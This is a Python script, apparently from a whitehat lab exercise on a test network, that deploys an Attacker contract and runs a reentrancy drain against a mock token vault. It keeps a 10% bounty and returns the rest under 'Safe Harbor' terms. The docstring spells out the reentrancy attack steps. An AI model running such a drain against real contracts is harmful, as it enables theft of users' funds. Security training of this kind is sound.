"""
Step 4 (Whitehat): Deploy Attacker and drain the vault.

The attack flow:
  1. Register a transfer hook on MockToken so this contract gets a callback on receive
  2. Deposit seed tokens to establish a non-zero balance in the vault
  3. Call withdrawAll() — vault transfers tokens, triggering our hook
  4. Inside onTokenTransfer(), call withdrawAll() again (balance still non-zero)
  5. Repeat until the vault is empty
  6. Split the haul per Safe Harbor terms and walk away clean

Prerequisites:
    TOKEN_ADDRESS    set in .env after running: just setup
    VAULT_ADDRESS    set in .env after running: just setup
    RECOVERY_ADDRESS set in .env (your wallet address)

Usage:
    just attack
    (or: mox run script/attack.py --network battlechain)
"""

import os

import boa
import vyper

from src import Attacker
from script.verify_contract import verify_contract

SEED_AMOUNT = 100 * 10**18   # 100 tokens
BOUNTY_BPS  = 1_000          # 10%
VYPER_VERSION = vyper.__version__


def moccasin_main() -> None:
    token_address    = os.environ.get("TOKEN_ADDRESS")
    vault_address    = os.environ.get("VAULT_ADDRESS")
    recovery_address = os.environ.get("RECOVERY_ADDRESS")

    if not token_address:
        raise ValueError("TOKEN_ADDRESS not set in .env")
    if not vault_address:
        raise ValueError("VAULT_ADDRESS not set in .env")
    if not recovery_address:
        raise ValueError("RECOVERY_ADDRESS not set in .env")

    # Read vault balance before attack
    erc20_abi = '[{"name":"balanceOf","type":"function","stateMutability":"view","inputs":[{"name":"account","type":"address"}],"outputs":[{"name":"","type":"uint256"}]}]'
    token = boa.loads_abi(erc20_abi, name="ERC20").at(token_address)
    vault_before = token.balanceOf(vault_address)
    print(f"Vault balance before: {vault_before / 10**18:.1f} tokens")

    # Deploy Attacker
    print("Deploying attacker...")
    attacker = Attacker.deploy(vault_address, token_address, recovery_address, BOUNTY_BPS)
    print(f"Attacker deployed: {attacker.address}")
    verify_contract(attacker.address, "src/Attacker.vy:Attacker", VYPER_VERSION)

    # Execute the attack
    attacker.attack(SEED_AMOUNT)

    # Tally
    vault_after = token.balanceOf(vault_address)
    bounty      = token.balanceOf(boa.env.eoa)
    returned    = token.balanceOf(recovery_address)

    print("\n--- Vault drained ---")
    print(f"Vault before:         {vault_before / 10**18:.1f} tokens")
    print(f"Vault after:          {vault_after  / 10**18:.1f} tokens")
    print(f"Bounty kept:          {bounty       / 10**18:.1f} tokens")
    print(f"Returned to protocol: {returned     / 10**18:.1f} tokens")
